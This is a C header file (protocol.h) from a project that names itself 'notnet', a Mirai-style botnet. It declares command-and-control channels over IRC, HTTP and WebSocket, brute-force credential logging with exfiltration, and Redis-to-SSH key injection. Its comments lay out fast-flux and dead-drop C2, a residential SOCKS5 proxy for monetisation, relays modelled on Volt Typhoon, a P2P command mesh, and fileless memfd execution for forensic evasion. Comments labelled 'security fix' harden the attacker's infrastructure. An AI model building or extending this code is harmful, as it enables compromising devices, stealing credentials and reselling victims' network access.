/*
 * notnet - Modern Mirai-Style Botnet
 * protocol.h - C2 protocol abstraction (IRC, HTTP, WebSocket)
 */
#ifndef NOTNET_PROTOCOL_H
#define NOTNET_PROTOCOL_H

#include "config.h"
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>

/* ── Credential-log buffer API (#90) ───────────────────────── */
/* Canonical declarations live in include/spread.h (the buffer is owned
 * by spread.c). Forward-declared here so both translation units that
 * drive the harvest/exfil see the API. Implements the smash-and-grab
 * log-sale model: every successful brute-force credential is buffered
 * in a bounded, mutex-protected queue and pulled by the `exfil_creds`
 * C2 command. See spread.h for the overflow policy and thread-safety
 * contract. */
void spread_cred_record(const char *proto, const char *ip, uint16_t port,
                        const char *user, const char *pass);
unsigned int spread_cred_count(void);
int spread_creds_drain(char **out, size_t *out_len);

/* ── Connection Types ───────────────────────────────────────── */
#define C2_IRC   0x01
#define C2_HTTP  0x02
#define C2_WS    0x04

/* ── TLS ─────────────────────────────────────────────────────── */
/* TLS wrapper for existing socket fds.
 * TLS_ENABLED must be defined at compile time (-DTLS_ENABLED).
 * If TLS is not compiled in, tls_* functions are no-ops that pass
 * through to the raw socket. */
typedef struct {
    int enabled;
    void *ssl;       /* SSL* from OpenSSL, or NULL if TLS disabled */
    int sock;        /* underlying socket fd */
} notnet_tls_t;

/* ── IRC State ──────────────────────────────────────────────── */
typedef struct {
    char server[256];
    uint16_t port;
    char channel[128];
    char pass[64];
    char nick[32];
    /* SECURITY FIX (#5): Authorized C2 operator nicks.
     * Only PRIVMSGs from these nicks are accepted as commands.
     * Populated from config (irc_auth_nicks=) or defaults to the
     * bot's own nick (self-commands only). */
    char auth_nicks[8][32];
    int auth_nick_count;
    /* SECURITY FIX (#10): DNS pinning to prevent rebinding attacks.
     * On first successful authenticated connection, the resolved IP
     * is cached here. Reconnects must use the same pinned IP. */
    int dns_pinned;
    struct in_addr pinned_addr;
    /* SECURITY FIX (#76): TLS state. Only used when compiled with
     * -DTLS_ENABLED and a cert pin is configured; otherwise disabled
     * and all I/O falls through to the raw socket. */
    notnet_tls_t tls;
    int sock;
    int connected;
    int authenticated;
    int joined;
    time_t last_ping;
} notnet_irc_t;

/* ── HTTP State ─────────────────────────────────────────────── */
typedef struct {
    char server[256];
    uint16_t port;
    char path[128];
    char user_agent[128];
    /* SECURITY FIX (#93): the endpoint actually connected to. When the
     * rotation chain (#93) is on a backup, http_connect dials the backup
     * host but http_post/http_get previously built the Host header from
     * bot->c2_http.server — the PRIMARY — so rotated requests carried the
     * wrong Host and the backup misrouted every heartbeat/response/exfil
     * (#110). Set at connect time from c2_rotation_endpoint(); request
     * builders read THIS, not c2_http.server. */
    char effective_server[256];
    uint16_t effective_port;
    /* SECURITY FIX (#10): DNS pinning */
    int dns_pinned;
    struct in_addr pinned_addr;
    /* SECURITY FIX (#76): TLS state (see notnet_irc_t.tls) */
    notnet_tls_t tls;
    int sock;
    int connected;
    time_t last_beat;
} notnet_http_t;

/* ── WebSocket State ────────────────────────────────────────── */
typedef struct {
    char server[256];
    uint16_t port;
    char path[128];
    /* SECURITY FIX (#10): DNS pinning */
    int dns_pinned;
    struct in_addr pinned_addr;
    /* SECURITY FIX (#76): TLS state (see notnet_irc_t.tls) */
    notnet_tls_t tls;
    int sock;
    int connected;
    time_t last_beat;
} notnet_ws_t;

/* ── Credentials Pool ───────────────────────────────────────── */
typedef struct {
    char username[64];
    char password[64];
} notnet_cred_t;

/* ── Bot State ──────────────────────────────────────────────── */
typedef struct {
    char hostname[BOT_MAX_HOSTNAME_LEN];
    time_t uptime;
    char os[BOT_MAX_OS_LEN];
    
    uint8_t c2_enabled;
    
    notnet_irc_t c2_irc;
    notnet_http_t c2_http;
    notnet_ws_t c2_ws;
    
    /* SECURITY FIX (#85): Fast-flux C2. When enabled, all three C2
     * channels resolve every A record of their hostname into a rotating
     * cache (see src/protocol.c), rotate the active IP every flux_ttl
     * seconds, and fail over to the next IP on connect/recv timeout.
     * DNS pinning (#10) is bypassed in flux mode by design — the peer
     * IP is expected to change. Disabled by default (single resolution). */
    uint8_t flux_enabled;
    uint32_t flux_ttl;   /* seconds between re-resolution + rotation */
    
    /* SECURITY FIX (#86): Dead-drop C2 resolution. When dead_drop_url is
     * set, the bot fetches an opaque C2-endpoint blob from a legitimate
     * service (Telegram channel, Steam profile, pastebin-style HTTP) at
     * boot and every dead_drop_interval seconds. The blob is applied only
     * if it echoes the shared c2_secret (see secret) — a fetch that fails,
     * is malformed, or does not verify leaves the static endpoints intact
     * (fail-closed). Empty dead_drop_url = disabled. */
    char dead_drop_url[512];
    uint32_t dead_drop_interval;   /* seconds between re-resolution */

    /* SECURITY FIX (#89): Residential SOCKS5 forward proxy. When
     * proxy_enabled=1 AND proxy_token is set, the bot listens on
     * proxy_port and forwards CONNECT requests (RFC 1928) to IPv4/domain
     * destinations after RFC 1929 user/pass auth — the token is the
     * password, possession of which grants egress through the bot's IP.
     * This monetizes the bot's network position as a residential proxy
     * (the 911 S5 / ZeroAccess-successor pattern). Empty proxy_token means
     * the proxy refuses to start (fail-closed). Configured via
     * proxy_enabled= / proxy_port= / proxy_token= in the config file or the
     * NOTNET_PROXY_TOKEN environment variable. */
    uint8_t proxy_enabled;
    uint16_t proxy_port;
    char proxy_token[64];

    /* SECURITY FIX (#91): ORB-style single-hop relay (the Volt Typhoon
     * pattern — proxy operations through compromised edge devices near
     * the victim). When relay_enabled=1 AND relay_token is set, the bot
     * listens on relay_port and accepts token-authenticated relay
     * requests (`RELAY <token> <target_host> <target_port>`), splicing
     * the connection to the requested target. The relay client helpers
     * (relay_connect/relay_probe) let the operator dial targets THROUGH
     * a relay bot instead of directly, and probe which relays can reach
     * which targets (per-target relay selection). Single-hop only in
     * this version; multi-hop chaining is future work. Explicitly NOT a
     * DHT — no peer discovery, no overlay. The same relay_token is
     * shared by the whole fleet. Configured via relay_enabled= /
     * relay_port= / relay_token= in the config file or the
     * NOTNET_RELAY_TOKEN environment variable. Empty relay_token means
     * the relay refuses to start (fail-closed). */
    uint8_t relay_enabled;
    uint16_t relay_port;
    char relay_token[64];

    /* SECURITY FIX (#139): Decentralized P2P command/peer mesh. A bounded
     * peer table (addr:port + last-seen) is gossiped over relay sockets
     * and seeded from the dead-drop blob's `peers=` field; the mesh
     * listener accepts ed25519-signed MESH frames (verified against the
     * operator pubkey baked at build time, fail-closed). When all C2
     * endpoints are down the fleet still relays operator commands — the
     * Mozi/Hajime design property. Off by default; requires a
     * relay_token (shared fleet token, used to authenticate MESH frames)
     * and an operator pubkey. mesh_static_peers[] is the optional
     * bootstrap list. Configured via mesh_enabled= / mesh_port= /
     * mesh_operator_pubkey= / mesh_static_peers_1..N= . */
    uint8_t mesh_enabled;
    uint16_t mesh_port;
    char mesh_operator_pubkey[65];        /* 64 hex + NUL */
    char mesh_static_peers[MESH_PEER_MAX][256];

    /* SECURITY FIX (#92): Loader/plugin framework (Bredolab/Emotet
     * split). When 1 (default) the built-in plugin registry is
     * bootstrapped at start and the `plugin` C2 command dispatches
     * capabilities by name (spread, proxy, relay, cred-log).
     * plugin_enabled=0 disables the framework: the registry is not
     * bootstrapped and the command is refused. Configured via
     * plugin_enabled= in the config file or the `plugin_enabled`
     * config_set key. */
    uint8_t plugin_enabled;

    /* SECURITY FIX (#94): BYOVD defense-neutralization guard. BYOVD
     * (bring-your-own-vulnerable-driver) is the commodity successor to
     * kernel rootkits — ESET catalogued ~90 EDR killers, 54 abusing a
     * shared pool of 35 legitimately signed drivers. notnet ships NO
     * driver-loading code: the byovd plugin is a DEFENSIVE-ONLY research
     * scaffold whose every operation is refused. When byovd_guard=1 the
     * plugin's load callback reports that BYOVD-style driver abuse is
     * blocked (fail-closed defensive stance). Configured via byovd_guard=
     * in the config file or the `byovd_guard` config_set key. */
    uint8_t byovd_guard;

    /* SECURITY FIX (#93): Disposable-infrastructure C2 rotation. A
     * bounded backup chain (c2_backup_1..4, each "host:port")
     * layered ABOVE the flux resolver (#85) — flux rotates IPs
     * within one hostname, rotation switches the whole HTTP endpoint.
     * After C2_ROTATE_FAIL_THRESHOLD consecutive primary-channel
     * connect failures the bot advances c2_rot_index through
     * [primary, backup_1..N], logging each switch, until
     * C2_ROTATE_MAX total rotations (no infinite churn). Index 0
     * always reads the live c2_http fields, so a dead-drop repoint
     * (#86) is honored immediately (and resets the failure streak —
     * a fresh drop gets a fair chance before any static backup
     * applies). c2_backup_count is the length of the contiguous
     * prefix of the list, c2_fail_streak the consecutive-failure
     * counter. */
    char c2_backup[C2_BACKUP_MAX][C2_BACKUP_STR_MAX];
    uint8_t c2_backup_count;
    uint8_t c2_rot_index;      /* 0 = primary, 1..N = backup slot */
    uint8_t c2_fail_streak;
    uint8_t c2_rotations;

    /* SECURITY FIX (#93): Affiliate/operator tag — the affiliate-model
     * primitive. A short (<= BOT_TAG_MAX) operator or campaign
     * identifier set via bot_tag= config (or the `bot_tag` config_set
     * key), reported in every heartbeat so the C2 can attribute bots
     * to affiliates (per-affiliate inventory, per-affiliate teardown)
     * and hand back capacity with `kill` without touching other
     * affiliates' hosts. Empty = unattributed. */
    char bot_tag[BOT_TAG_MAX];

    /* SECURITY FIX (#93): `kill` command latch. Set by the dispatch
     * loop after wiping the cred buffer and stopping proxy/relay/
     * plugin stop callbacks; the main loop breaks on it so cleanup
     * (lock removal, log flush) runs and main returns EXIT_SUCCESS
     * (exit code 0). One-way door — no un-kill. */
    uint8_t kill_pending;

    /* Credentials */
    notnet_cred_t cred_pool[CRED_POOL_MAX];
    int cred_count;
    
    /* Scan config */
    uint32_t scan_interval;
    uint32_t scan_count;
    
    /* Commands queue */
    char cmd_queue[256][256];
    int cmd_count;
    
    /* Config overrides */
    uint8_t ssh_enabled;
    uint8_t telnet_enabled;
    uint8_t smb_enabled;
    uint8_t redis_enabled;
    uint8_t rdp_enabled;

    /* SECURITY FIX (#84): RAM-only fileless operation. When 0, no
     * persistence is installed and (on Linux) the bot relaunches itself
     * from an anonymous memfd so the running binary has no disk-backed
     * executable. Reboot loses the infection by design — deliberate
     * forensic evasion, not a bug. */
    uint8_t persist_enabled;

    /* Scan targets (explicit IPs/subnets, override default subnets) */
    int scan_target_count;
    char scan_targets[16][256];

    /* Runtime scan limits (for testing) */
    uint32_t scan_timeout_ms;
    uint32_t scan_max_hosts;

    /* #191: per-command brute-force wall-clock budget in ms
     * (config key spread_budget_ms, clamped 5000..600000). */
    uint32_t spread_budget_ms;

    /* Heartbeat interval in seconds (0 = use default) */
    uint32_t heartbeat_interval;

    /* Update tracking */
    time_t last_update;

    /* SECURITY FIX (#35): Shared secret for HTTP/WS C2 authentication.
     * The bot includes it in every heartbeat; the C2 must echo it back
     * in command responses. Commands without a valid secret echo are
     * rejected, giving HTTP/WS the same trust boundary IRC has via the
     * nick allowlist. Configured via c2_secret= in the config file or
     * the NOTNET_C2_SECRET environment variable. Empty = fail-closed
     * (HTTP/WS commands are never trusted). */
    char secret[64];

    /* SECURITY FIX (#81): Expected SHA-256 of the payload binary, as a
     * 64-char lowercase hex string. payload_update() rejects any download
     * whose hash does not match, closing the MITM RCE hole where a 4-byte
     * 'NOTN' magic was the only integrity check (CWE-345). Configured via
     * payload_sha256= in the config file or the NOTNET_PAYLOAD_SHA256
     * environment variable. Empty = fail-closed (update is refused). */
    char payload_sha256[65];

    /* SECURITY FIX (#72): SSH public key injected into Redis
     * authorized_keys (redis_ssh_key= config or NOTNET_REDIS_SSH_KEY env).
     * The old code injected a literal placeholder that OpenSSH rejects,
     * so the Redis -> SSH-22 pivot could never authenticate. */
    char redis_ssh_key[1024];

    /* SECURITY FIX (#76): SHA-256 fingerprint pin of the TLS server
     * certificate. When compiled with -DTLS_ENABLED and this pin is set,
     * all three C2 channels wrap their sockets in TLS and verify the peer
     * cert fingerprint before use. Config: tls_cert_pin_sha256= or env
     * NOTNET_TLS_CERT_PIN_SHA256. Empty = TLS not activated. */
    char tls_cert_pin_sha256[65];

    /* On-target compilation (#69/#81): when binary download fails or the
     * payload pin mismatches, the bot can fetch the source tarball from
     * the C2, verify it against payload_source_sha256 (fail-closed), and
     * compile locally. All three are required for the fallback to run. */
    uint8_t payload_compile_enabled;
    char payload_source_url[512];
    char payload_source_sha256[65];

    /* SECURITY FIX (#14): Rate limiting for C2 commands */
    time_t last_cmd_time;
    int cmd_this_second;
} notnet_bot_t;

/* ── IRC Functions ──────────────────────────────────────────── */
int irc_connect(notnet_bot_t *bot);
int irc_send(notnet_bot_t *bot, const char *format, ...);
int irc_read(notnet_bot_t *bot, char *buf, int len);
void irc_disconnect(notnet_bot_t *bot);

/* ── HTTP Functions ─────────────────────────────────────────── */
int http_connect(notnet_bot_t *bot);
int http_post(notnet_bot_t *bot, const char *data, int len);
/* API CONTRACT (#60): http_read() returns the FULL HTTP response —
 * status line, headers, and body — into buf, and return the total number
 * of bytes received (or -1 on error, 0 when nothing was readable). It does
 * NOT strip headers. Callers that need only the body must locate the
 * "\r\n\r\n" header terminator themselves (as protocol_process_commands
 * and http_download already do). The dead http_get() was removed in the
 * #112 dead-code sweep; http_get_url() below is the live arbitrary-URL
 * fetch. */
/* Dead-drop / arbitrary-URL fetch (#86): GET a plaintext http:// URL into
 * buf (bounded to len bytes total incl. headers) with a 10s timeout, and
 * return the total bytes received (full response — status, headers, body;
 * caller strips the "\r\n\r\n" terminator). This does NOT require an
 * existing C2 connection and can target any host. Cleartext only
 * (the default build has no TLS); callers must NOT treat the transport as a
 * trust boundary. Returns -1 on failure, non-2xx, or empty body. */
int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len);
/* #190: drop URL builder — one-time download token with ?secret= fallback. */
int build_drop_url(notnet_bot_t *bot, char *dl_url, size_t sz);
int http_read(notnet_bot_t *bot, char *buf, int len);
int http_download(notnet_bot_t *bot, const char *url, const char *dest);
int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_path);
void http_disconnect(notnet_bot_t *bot);

/* ── WebSocket Functions ────────────────────────────────────── */
int ws_connect(notnet_bot_t *bot);
int ws_send(notnet_bot_t *bot, const char *data, int len);
int ws_read(notnet_bot_t *bot, char *buf, int len);
void ws_disconnect(notnet_bot_t *bot);

/* ── Core Protocol ──────────────────────────────────────────── */
int protocol_connect_all(notnet_bot_t *bot);
int protocol_process_commands(notnet_bot_t *bot);
int protocol_send_heartbeat(notnet_bot_t *bot);
int protocol_resolve_host(const char *host);
char *protocol_hex_encode(const char *data, int len);
int protocol_send_response(notnet_bot_t *bot, const char *command, const char *result);

/* ── TLS ─────────────────────────────────────────────────────── */
/* (notnet_tls_t is defined above, before the channel structs that
 * embed it.) */
int tls_init(notnet_tls_t *tls, int sock);
int tls_setup(notnet_tls_t *tls, int sock, const char *server_name,
              const char *pin_hex);
int tls_pending(notnet_tls_t *tls);
int chan_send(notnet_tls_t *tls, int sock, const char *buf, int len);
int chan_recv(notnet_tls_t *tls, int sock, char *buf, int len);
int tls_handshake(notnet_tls_t *tls, const char *server_name);
int tls_send(notnet_tls_t *tls, const char *buf, int len);
int tls_recv(notnet_tls_t *tls, char *buf, int len);
void tls_close(notnet_tls_t *tls);
void tls_cleanup(void);

/* ── Config ─────────────────────────────────────────────────── */
int load_config(notnet_bot_t *bot, const char *path);

/* ── Disposable-Infrastructure C2 Rotation (#93) ─────────────── */
/* Report the outcome of a primary-channel attempt. success=1 resets
 * the consecutive-failure streak; success=0 increments it and rotates
 * to the next endpoint once C2_ROTATE_FAIL_THRESHOLD is hit (capped
 * at C2_ROTATE_MAX total rotations). Called by the HTTP connect path. */
void c2_rotation_note_result(notnet_bot_t *bot, int success);

/* Manual `rotate` command: advance the chain immediately (operator
 * intent — does not consume the automatic-churn budget). */
void c2_rotation_manual(notnet_bot_t *bot);

/* A dead-drop repoint (#86) changed the primary endpoint under us:
 * reset the failure streak and return to the primary so the fresh
 * drop is tried before any static backup applies. */
void c2_rotation_note_repoint(notnet_bot_t *bot);

#endif /* NOTNET_PROTOCOL_H */
